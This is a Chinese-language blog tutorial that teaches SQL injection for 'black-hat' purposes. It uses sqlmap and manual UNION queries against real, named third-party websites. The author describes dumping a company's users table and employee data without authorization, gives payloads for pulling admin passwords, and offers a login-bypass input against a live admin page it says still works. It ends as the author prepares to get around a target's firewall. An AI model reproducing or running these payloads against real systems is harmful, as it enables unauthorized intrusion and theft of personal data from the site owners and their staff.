<template><div><h1 id="example1" tabindex="-1"><a class="header-anchor" href="#example1"><span>Example1</span></a></h1>
<blockquote>
<p>谁从小还没有一个当黑帽子的梦想呢，所以就来讲讲SQL💉🩸吧...</p>
</blockquote>
<h2 id="环境要求" tabindex="-1"><a class="header-anchor" href="#环境要求"><span>环境要求</span></a></h2>
<ul>
<li><strong>sqlmap</strong>命令行工具</li>
<li>使用<strong>Go</strong>语言安装包：<strong>waybackruls</strong> (需要在自己的电脑上部署)</li>
</ul>
<h2 id="寻找目标-url" tabindex="-1"><a class="header-anchor" href="#寻找目标-url"><span>寻找目标 url</span></a></h2>
<p>对目标网站使用：</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>echo</span><span class="space"> </span><span>https://xxx</span><span class="space"> </span><span>|</span><span class="space"> </span><span>waybackurls</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>命令来打印历史 <strong>url</strong> 信息。如果运气好🍀会返回该网站的很多相关<code v-pre>url</code>信息，也有可能没有任何信息。在其中找到一个类似：<code v-pre>https://xxxx/?value=xxx</code>的查询路由，记住这条路由接下来使用<strong>sqlmap</strong>进行注入。</p>
<h2 id="sqlmap-💉注入" tabindex="-1"><a class="header-anchor" href="#sqlmap-💉注入"><span>sqlmap 💉注入</span></a></h2>
<h3 id="【注入数据库】-current-db" tabindex="-1"><a class="header-anchor" href="#【注入数据库】-current-db"><span>【注入数据库】--current-db</span></a></h3>
<p>使用这条命令进行注入:</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>sqlmap</span><span class="space"> </span><span>-u</span><span class="space"> </span><span>'https://xxx?value=xxx'</span><span class="space"> </span><span>--current-db</span><span class="space"> </span><span>--random-agent</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这条命令会检索当前的数据库的信息，遇到<code v-pre>redirect</code>直接<code v-pre>Y</code>回车即可。</p>
<p>可选参数以及作用：</p>
<ul>
<li><code v-pre>--random-agent</code>:如果注入后提示 <strong>timeout</strong> 超时⚠️，则应尝试该命令，伪装成随机的代理。</li>
<li><code v-pre>--level=5 --threads=5</code>：该命令可以使注入更快。</li>
</ul>
<p>如果成功，将会得到一个提示信息(假设它的数据库是<code v-pre>goodmoning_db</code>)：</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>current</span><span class="space"> </span><span>database:</span><span class="space"> </span><span>'goodmoning_db'</span><span class="space"> </span><span>--random-agent</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><blockquote>
<p>很显然，我没有得到它。但是如果你得到了这个，恭喜你🎉，可以继续往下注入！</p>
</blockquote>
<h3 id="【注入tables】-d-xxx-db-tables" tabindex="-1"><a class="header-anchor" href="#【注入tables】-d-xxx-db-tables"><span>【注入tables】-D 'xxx_db' --tables</span></a></h3>
<p>在获得数据库后，我们可以通过<code v-pre>sqlmap</code>查询该库中有哪些<code v-pre>table</code>：</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>sqlmap</span><span class="space"> </span><span>-u</span><span class="space"> </span><span>'https://mygm.in/?cat=1'</span><span class="space"> </span><span>-D</span><span class="space"> </span><span>goodmorning_db</span><span class="space"> </span><span>--tables</span><span class="space"> </span><span>--radom-agent</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这里不妨假设你已经得到了一个可疑的查询<code v-pre>url</code>，并且你通过上面的步骤得到了一个数据库<code v-pre>goodmorning_db</code>，我们使用了随机代理来提高成功率。假设你成功了，那么你会得到一个<code v-pre>tables</code>的列表。</p>
<blockquote>
<p>如果你发现有点满，试试上面提到的<code v-pre>--threads=5</code>和<code v-pre>--level=5</code>这两个参数，我说过，他们可以提速！</p>
</blockquote>
<h3 id="【注入table】-t-xxx-dump" tabindex="-1"><a class="header-anchor" href="#【注入table】-t-xxx-dump"><span>【注入table】- T xxx --dump</span></a></h3>
<p>假设在上一步你运气很好，得到了一个<code v-pre>tables</code>的表，其中有一个<code v-pre>users</code>的<code v-pre>table</code>：</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>xxx</span></span>
<span class="line"><span>xxx</span></span>
<span class="line"><span>xxx</span></span>
<span class="line"><span>users</span></span>
<span class="line"><span>xxx</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>那你就可以使用如下的命令进行</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>sqlmap</span><span class="space"> </span><span>-u</span><span class="space"> </span><span>'https://mygm.in/?cat=1'</span><span class="space"> </span><span>-D</span><span class="space"> </span><span>goodmorning_db</span><span class="space"> </span><span>-T</span><span class="space"> </span><span>users</span><span class="space"> </span><span>--dump</span><span class="space"> </span><span>--threads=5</span><span class="space"> </span><span>--random-agent</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>如果成功了，你将会得到表中的数据📊，运气好🍀将可能中奖得到管理员的账号密码，但有可能得到的密码是被加密的，你可能需要去解密它。</p>
<h2 id="小结" tabindex="-1"><a class="header-anchor" href="#小结"><span>小结</span></a></h2>
<p>虽然看起来很简单，但很可能第一步你都没办法实现，根据本人亲自试验，大部分网站无法使用<code v-pre>waybackurls</code>进行历史的追溯，如果能追溯的网站，也不太能被你找到漏洞。</p>
<h2 id="实战" tabindex="-1"><a class="header-anchor" href="#实战"><span>实战</span></a></h2>
<p>本来本人觉得学完可能也用不到，结果转折来了，我在网上根据网站的特征还真找到一个可以注入的网站，下面来一波教学～</p>
<p>首先，根据这篇博客，我们就能最大程度的找到能够sql注入的网站：<a href="https://zhuanlan.zhihu.com/p/57751709" target="_blank" rel="noopener noreferrer">寻找sql注入网站的方法</a>，根据文章的方法，我们在搜索栏中输入想要的网站特征🤔：</p>
<p><img src="https://p.ipic.vip/tp7n0q.png" alt="截屏2024-11-20 07.09.04"></p>
<p>一路试下来找到这样一个网站：</p>
<p><img src="https://p.ipic.vip/8ddqzr.png" alt="截屏2024-11-20 07.10.03"></p>
<p>我们进去，在路由最后加一个引号会发现网站出现变化，原本搜索出来的内容消失了，这就代表出现了错误，只是没有显示给我们看而已！</p>
<p><img src="https://p.ipic.vip/r3qxfq.png" alt="截屏2024-11-20 07.11.52"></p>
<p>继续往下寻找信息，会发现加后面加上<code v-pre>' order by 1 -- -</code>网站正常显示，但是如果<code v-pre> order by 8 -- -</code>就又消失了，说明了两点：</p>
<ul>
<li>网站对<code v-pre>sql注入</code>基本不防护</li>
<li>该数据表有<strong>7</strong>列</li>
</ul>
<p>使用<code v-pre>order by 8</code>会出现异常：</p>
<p><img src="https://p.ipic.vip/ipad0p.png" alt="截屏2024-11-20 07.15.40"></p>
<p>但是使用<code v-pre>order by 1</code>正常显示：</p>
<p><img src="https://p.ipic.vip/huzwhp.png" alt="截屏2024-11-20 07.31.24"></p>
<p>所有的这一切都在告诉我们一个信息，这个网站随便注入，所以打开<code v-pre>kali</code>终端进行sqlmap注入。</p>
<p>第一步，查询对应的数据库：</p>
<p><img src="https://p.ipic.vip/2lrjh9.png" alt="截屏2024-11-20 07.19.29"></p>
<p>得到信息，数据库名为<strong>bygptech</strong>，这下跑不掉了。</p>
<p><img src="https://p.ipic.vip/geyrxo.png" alt="截屏2024-11-20 07.21.17"></p>
<p>利用该库名查询内部表：</p>
<p><img src="https://p.ipic.vip/rj9o72.png" alt="截屏2024-11-20 07.24.42"></p>
<p>查到内部的表如下：</p>
<p><img src="https://p.ipic.vip/6j03np.png" alt="截屏2024-11-20 07.25.06"></p>
<p>这里面我看<code v-pre>users</code>最不爽😕，所以先拿它下手🤓，注入<code v-pre>users</code>：</p>
<p><img src="https://p.ipic.vip/6au8t1.png" alt="截屏2024-11-20 07.26.27"></p>
<p>拿到<code v-pre>users</code>内部数据，保存在该目录：</p>
<p><img src="https://p.ipic.vip/34bunt.png" alt="截屏2024-11-20 07.27.13"></p>
<p>将<code v-pre>csv</code>拷贝到虚拟机外，工作结束🥸：</p>
<blockquote>
<p>可以看出来，这里的数据大多都是该公司的员工信息。</p>
</blockquote>
<p><img src="https://p.ipic.vip/xdpxcr.png" alt="截屏2024-11-20 07.27.57"></p>
<blockquote>
<p>本人第一次<strong>hack</strong>别人的网站，有点小激动，各位大佬都坐好，误笑本菜。</p>
</blockquote>
<h1 id="example2" tabindex="-1"><a class="header-anchor" href="#example2"><span>Example2</span></a></h1>
<blockquote>
<p>Example1中使用了sqlmap一把梭，这次使用手动注入的方法。建议提前安装好Firefox浏览器，不然会很痛苦。</p>
</blockquote>
<h2 id="获取列数" tabindex="-1"><a class="header-anchor" href="#获取列数"><span>获取列数</span></a></h2>
<p>首先使用<code v-pre>'</code>单引号来尝试注入网站，如果网站在被使用<code v-pre>'</code>注入后发生了变化，说明sql注入有概率可行。</p>
<p>通过在<code v-pre>url</code>后加上下面的代码来获取列的数量。</p>
<div class="language-mysql line-numbers-mode" data-ext="mysql" data-title="mysql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>'</span><span class="space"> </span><span>order</span><span class="space"> </span><span>by</span><span class="space"> </span><span>数字</span><span class="space"> </span><span>--</span><span class="space"> </span><span>-</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>该网站的sql代码原理如下:</p>
<blockquote>
<p>注意下面有三个引号，其中两遍的引号都是数据库查询自带的，中间由于我们手动添加了一个引号，构造出了一个绕过的代码，请自行理解。</p>
<p><code v-pre>-- -</code>：左边两个<code v-pre>-</code>表示注释，但是右边额外加了个一有点不明所以的<code v-pre>-</code>，这是因为在sql中，如果注释右边没有内容，有可能引发错误，所以一般会添加一个字符来占位，为了省事就直接使用<code v-pre>-</code>来作为注释的内容🥵。</p>
</blockquote>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>select</span><span class="space"> </span><span>*</span><span class="space"> </span><span>from</span><span class="space"> </span><span>table</span><span class="space"> </span><span>where</span><span class="space"> </span><span>id='9'</span><span class="space"> </span><span>order</span><span class="space"> </span><span>by</span><span class="space"> </span><span>3</span><span class="space"> </span><span>--</span><span class="space"> </span><span>-</span><span class="space"> </span><span>';</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>将这里的<code v-pre>column</code>换成数字就可以按照指定列来进行排序，所以如果列的序号存在能被查询到结果，否则查询到的结果为空。</p>
<p>SQL中的原理如下：</p>
<ul>
<li>
<p>首先创建了一张表作为测试</p>
<img src="https://p.ipic.vip/gb1irc.png" alt="截屏2024-11-24 18.45.46" style="zoom: 25%;" />
</li>
<li>
<p>插入数据</p>
<img src="https://p.ipic.vip/mmnbsk.png" alt="截屏2024-11-24 18.47.55" style="zoom:25%;" />
</li>
<li>
<p>正常查询的结果：</p>
<img src="https://p.ipic.vip/eh96vl.png" alt="截屏2024-11-24 18.48.57" style="zoom:25%;" />
</li>
<li>
<p>经过<code v-pre>order by</code> 的排序后的结果：</p>
<img src="https://p.ipic.vip/qzyywm.png" alt="截屏2024-11-24 18.49.52" style="zoom:25%;" />
</li>
<li>
<p>将成绩改成列的序号</p>
<img src="https://p.ipic.vip/krf7q7.png" alt="截屏2024-11-24 18.50.41" style="zoom:25%;" />
</li>
</ul>
<p>然后在Firefox中安装<code v-pre>HackerBar V2</code>这个扩展，请不要错误安装<code v-pre>HackBar</code>，没有V2后缀的版本是收费的。</p>
<img src="https://p.ipic.vip/nq3x1r.png" alt="HackerV2扩展" style="zoom:25%;" />
<p>确认列数后并确保你安装了<code v-pre>HackBar V2</code>，我们按下<code v-pre>F12</code>，对于博阳科技官网，我发现他有7列。</p>
<p><img src="https://p.ipic.vip/78tuyk.png" alt="截屏2024-11-24 19.04.50"></p>
<h2 id="寻找注入点" tabindex="-1"><a class="header-anchor" href="#寻找注入点"><span>寻找注入点</span></a></h2>
<p>选择<strong>SQL</strong>&gt;<strong>Union</strong>&gt;<strong>Union All Select Statement</strong>，输入你的列数，自动生成了如下内容：</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>UNION</span><span class="space"> </span><span>ALL</span><span class="space"> </span><span>SELECT</span><span class="space"> </span><span>1,2,3,4,5,6,7</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>复制它，将它替换原来的<strong>order by</strong>功能，url变成了：</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>http://www.bygptech.com/about.php?id=9</span><span class="space"> </span><span>'</span><span class="space"> </span><span>UNION</span><span class="space"> </span><span>ALL</span><span class="space"> </span><span>SELECT</span><span class="space"> </span><span>1,2,3,4,5,6,7</span><span class="space"> </span><span>--</span><span class="space"> </span><span>垃圾网站</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这相当于是在说，把7列的查询结果合并成一张表交给前端，但是实际上你这么做了页面也没有任何的变化。你需要将它改为：</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>http://www.bygptech.com/about.php?id=-9</span><span class="space"> </span><span>'</span><span class="space"> </span><span>UNION</span><span class="space"> </span><span>ALL</span><span class="space"> </span><span>SELECT</span><span class="space"> </span><span>1,2,3,4,5,6,7</span><span class="space"> </span><span>--</span><span class="space"> </span><span>垃圾网站</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><blockquote>
<p>你可能已经注意到了，我们把id的查询改为了-9，但其实你可以试试，id等于多少并不重要，你可以随意将它改为123或者-1231之类的任何值，但只要他不是一个有效的值，你就可以绕过正常的查询。</p>
</blockquote>
<p>我们还是继续来猜测sql中的原理：</p>
<img src="https://p.ipic.vip/oobi6w.png" alt="截屏2024-11-24 19.13.21" style="zoom:25%;" />
<p>如果没有绕过，union 查询将会有一个正确查询到的结果，并上我们后面自己添加的三个值，这就是我们要修改id的值的原因以及原理。</p>
<img src="https://p.ipic.vip/ua6cgi.png" alt="截屏2024-11-24 19.15.40" style="zoom:25%;" />
<p>我们之所以需要获取列数量的信息，就是因为下面这个例子，如果Union查询并上的列数量不一致就会报错。</p>
<img src="https://p.ipic.vip/5glyq2.png" alt="截屏2024-11-24 19.16.34" style="zoom:25%;" />
<p>再来一个例子：</p>
<img src="https://p.ipic.vip/6p659q.png" alt="截屏2024-11-24 19.18.33" style="zoom:25%;" />
<p>我么可以得到结论，使用id=&quot;-9&quot;是为了让查询到的id结果为空，这样最后的结果只有我们union上的数据作为给前端唯一数据，才能让我们想要的数据渲染到页面上。<strong>UNION SELECT</strong>后面的合并数量要和table中的列数量一致，但是值是什么都行。</p>
<h2 id="嗅探数据库基本信息" tabindex="-1"><a class="header-anchor" href="#嗅探数据库基本信息"><span>嗅探数据库基本信息</span></a></h2>
<p>根据结果，我们可以看到，页面只渲染了第二列和第四列位置的值，所以我们只需要将<strong>2</strong>和<strong>4</strong>改成我们想知道的值，他就会被渲染到页面上，我们就可以嗅探到数据库内部的一些重要信息，例如数据库版本等。</p>
<img src="https://p.ipic.vip/fjlcin.png" alt="截屏2024-11-24 19.22.31" style="zoom:25%;" />
<p>例如，可以把url中的2换成<code v-pre>database()</code>，然后你就可以看到数据库的名字是什么了。</p>
<img src="https://p.ipic.vip/d5mhv4.png" alt="截屏2024-11-24 19.25.27" style="zoom:25%;" />
<p>像这样的sql内建函数有很多，我们不一定记得住，不过没有关系！☝️🤓我们不是安装了<code v-pre>HackBar V2</code>吗，骇客神条会给你答案，下面是操作方法：</p>
<img src="https://p.ipic.vip/d9tdhg.png" alt="截屏2024-11-24 19.26.54" style="zoom:25%;" />
<p>在<code v-pre>HackBar V2</code>中选择<strong>SQL</strong>&gt;<strong>Union</strong>&gt;<strong>Basic info column</strong>，得到的就是基本的信息函数。</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>CONCAT_WS(CHAR(32,58,32),user(),database(),version())</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2 id="嗅探表明" tabindex="-1"><a class="header-anchor" href="#嗅探表明"><span>嗅探表明</span></a></h2>
<p>我们可以使用如下命令</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>http://www.bygptech.com/about.php?id=114514</span><span class="space"> </span><span>'</span><span class="space"> </span><span>UNION</span><span class="space"> </span><span>ALL</span><span class="space"> </span><span>SELECT</span><span class="space"> </span><span>1,2,3,group_concat(table_name),5,6,7</span><span class="space"> </span><span>from</span><span class="space"> </span><span>information_schema.tables</span><span class="space"> </span><span>where</span><span class="space"> </span><span>table_schema=database()</span><span class="space"> </span><span>--</span><span class="space"> </span><span>垃圾网站</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>然后你会得到<code v-pre>database()</code>这张表中的所有表名，我们来分析一下🧐：</p>
<p>首先查询这句<strong>sql</strong>，能得到一个关于<code v-pre>databse()</code>数据库的表，其中有两列需要关注：<code v-pre>TABLE_NAME</code>，<code v-pre>TABLE_SCHEMA</code>。这句话从<code v-pre>information_schema</code>这个信息数据库中查询<code v-pre>tables</code>表，并从<code v-pre>tables</code>表中筛选出数据库为<code v-pre>database()</code>的信息。</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>SELECT</span><span class="space"> </span><span>*</span><span class="space"> </span><span>FROM</span><span class="space"> </span><span>information_schema.`TABLES`</span><span class="space"> </span><span>WHERE</span><span class="space"> </span><span>table_schema=DATABASE();</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><img src="https://p.ipic.vip/7b0uos.png" alt="截屏2024-11-24 19.42.43" style="zoom: 25%;" />
<p>通过<code v-pre>group_cancat()</code>可以将某一列中的值拼成一句，就得到了所有的<strong>table</strong>。</p>
<img src="https://p.ipic.vip/hcdw60.png" alt="截屏2024-11-24 19.44.38" style="zoom:25%;" />
<p>查询到表的集合会被渲染在页面上：</p>
<img src="https://p.ipic.vip/7yv6x9.png" alt="截屏2024-11-24 19.48.53" style="zoom:25%;" />
<p>唯一的问题就是，它不是很简单易读，所以可以这样做来增加它的易读性，也就是在每一个<code v-pre>,</code>后面增加一个换行。</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>http://www.bygptech.com/about.php?id=114514</span><span class="space"> </span><span>'</span><span class="space"> </span><span>UNION</span><span class="space"> </span><span>ALL</span><span class="space"> </span><span>SELECT</span><span class="space"> </span><span>1,group_concat(table_name,</span><span class="space"> </span><span>'&#x3C;br>'),3,4,5,6,7</span><span class="space"> </span><span>from</span><span class="space"> </span><span>information_schema.tables</span><span class="space"> </span><span>where</span><span class="space"> </span><span>table_schema=database()</span><span class="space"> </span><span>--</span><span class="space"> </span><span>垃圾网站</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><img src="https://p.ipic.vip/aquozr.png" alt="截屏2024-11-24 19.50.27" style="zoom:25%;" />
<blockquote>
<p>它们看起来很棒🎉不是吗？</p>
</blockquote>
<h2 id="嗅探列名" tabindex="-1"><a class="header-anchor" href="#嗅探列名"><span>嗅探列名</span></a></h2>
<p>接下来我们将继续使用<code v-pre>group_concat()</code>来获取这里<code v-pre>user</code>表中的所有列名。</p>
<p>我们可以通过<code v-pre>information</code>中的<code v-pre>COLUMNS</code>这张表来得到所有数据库和数据表的列名信息，包括<code v-pre>user</code>。</p>
<img src="https://p.ipic.vip/suwu2o.png" alt="截屏2024-11-24 19.56.03" style="zoom: 25%;" />
<p>如果将<strong>TABLE_NAME</strong>限制为具体的表名，再将结果进行<code v-pre>group_concat()</code>就可以在页面显示所有的列名。</p>
<img src="https://p.ipic.vip/rxnqy5.png" alt="截屏2024-11-24 19.57.47" style="zoom:25%;" />
<p>所以，使用下面的命令来获取该网站的<code v-pre>trade</code>表中的列名：</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>http://www.bygptech.com/about.php?id=114514</span><span class="space"> </span><span>'</span><span class="space"> </span><span>UNION</span><span class="space"> </span><span>ALL</span><span class="space"> </span><span>SELECT</span><span class="space"> </span><span>1,group_concat(column_name,</span><span class="space"> </span><span>'&#x3C;br>'),3,4,5,6,7</span><span class="space"> </span><span>from</span><span class="space"> </span><span>information_schema.columns</span><span class="space"> </span><span>where</span><span class="space"> </span><span>table_name='trade'</span><span class="space"> </span><span>--</span><span class="space"> </span><span>垃圾网站</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>可以嗅探到列名如下：</p>
<img src="https://p.ipic.vip/834z30.png" alt="截屏2024-11-24 20.02.34" style="zoom:25%;" />
<h2 id="嗅探数据" tabindex="-1"><a class="header-anchor" href="#嗅探数据"><span>嗅探数据</span></a></h2>
<p>接下来我们试试嗅探<code v-pre>admin</code>表中的密码：</p>
<blockquote>
<p>admin表中的列如下：</p>
</blockquote>
<div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>adminid</span></span>
<span class="line"><span>,adminname</span></span>
<span class="line"><span>,password</span></span>
<span class="line"><span>,addtime</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>http://www.bygptech.com/about.php?id=114514</span><span class="space"> </span><span>'</span><span class="space"> </span><span>union</span><span class="space"> </span><span>select</span><span class="space"> </span><span>1,group_concat(password,</span><span class="space"> </span><span>'&#x3C;br>'),3,4,5,6,7</span><span class="space"> </span><span>from</span><span class="space"> </span><span>admin;</span><span class="space"> </span><span>--</span><span class="space"> </span><span>-</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h1 id="example-3" tabindex="-1"><a class="header-anchor" href="#example-3"><span>Example 3</span></a></h1>
<h2 id="灵活使用payloads" tabindex="-1"><a class="header-anchor" href="#灵活使用payloads"><span>灵活使用payloads</span></a></h2>
<blockquote>
<p>在这个例子将会教你如何绕过admin登陆表单，仅限于一些没有防护措施的网站。</p>
</blockquote>
<p>就本人写这篇文章的时间节点，下面这个网站仍然可以作为你的实验：</p>
<div class="language-apl line-numbers-mode" data-ext="apl" data-title="apl"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>https://www.sspf.in/admin/</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>搜索: <code v-pre>sql payloads github</code>，或者访问这个链接: <a href="https://github.com/payloadbox/sql-injection-payload-list" target="_blank" rel="noopener noreferrer">Github注入网站</a></p>
<p>进入这个网站，你能看到很多注入的命令，使用这些命令作为表单的输入：</p>
<img src="https://p.ipic.vip/ksrhgh.png" alt="截屏2024-11-24 22.52.09" style="zoom:25%;" />
<p>这里我输入<code v-pre>' or 1=1 limit 1 -- -</code>作为<strong>Username</strong>，<code v-pre>'</code>作为<strong>Password</strong>，结果也是相当粗暴（成功绕过后台登陆）：</p>
<img src="https://p.ipic.vip/ggzu04.png" alt="截屏2024-11-24 22.53.44" style="zoom:25%;" />
<h1 id="example-4" tabindex="-1"><a class="header-anchor" href="#example-4"><span>Example 4</span></a></h1>
<blockquote>
<p>再这个例子中，你将会得到更强的提升，我将会以一个带有域名防火墙的网站作为例子。</p>
</blockquote>
<h2 id="安装工具" tabindex="-1"><a class="header-anchor" href="#安装工具"><span>安装工具</span></a></h2>
<p>你需要一个<code v-pre>subfinder</code>，这是一个基于Go语言的命令行工具，你可以通过下面的命令安装他，不过前提是你已经安装了Go，如果没有，使用<strong>brew</strong>来安装Go再继续。</p>
<div class="language-apl line-numbers-mode" data-ext="apl" data-title="apl"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>go</span><span class="space"> </span><span>install</span><span class="space"> </span><span>-v</span><span class="space"> </span><span>github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2 id="尝试注入" tabindex="-1"><a class="header-anchor" href="#尝试注入"><span>尝试注入</span></a></h2>
<p>这是我们需要黑入的网站，我已经帮你找好了它的注入点：</p>
<p>访问下面这个<strong>url</strong>这是我们需要攻击的目标：</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>https://nied.co.in/course.php?course=1</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>根据之前所学，如果想要手动黑入该网站，需要先嗅探列的数量：</p>
<div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>https://nied.co.in/course.php?course=1</span><span class="space"> </span><span>'</span><span class="space"> </span><span>order</span><span class="space"> </span><span>by</span><span class="space"> </span><span>40</span><span class="space"> </span><span>--</span><span class="space"> </span><span>-</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>根据算法的知识，我们可以使用二分法来测试列的数量，这样时间复杂度可以到达指数级别。根据本人亲测，该网站有40列。</p>
<p>下一步就是打开黑客条V2来进行Union查询。</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>https://nied.co.in/course.php?course=1</span><span class="space"> </span><span>'</span><span class="space"> </span><span>UNION</span><span class="space"> </span><span>ALL</span><span class="space"> </span><span>SELECT</span><span class="space"> </span><span>1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>然后你就会遇到今天最幸运的事情，没错，一个防火墙 - &quot;FireWall&quot;！😄</p>
<img src="https://p.ipic.vip/i0uzug.png" alt="截屏2024-11-25 00.18.21" style="zoom:25%;" />
<p>你以为这就结束了吗，不不不，我们可以做到，相信黑帽子！对于防火墙来说，很有可能只是对特定的域名做了防火墙的防护。所以如果使用子域名来进行注入，就有可能成功。</p>
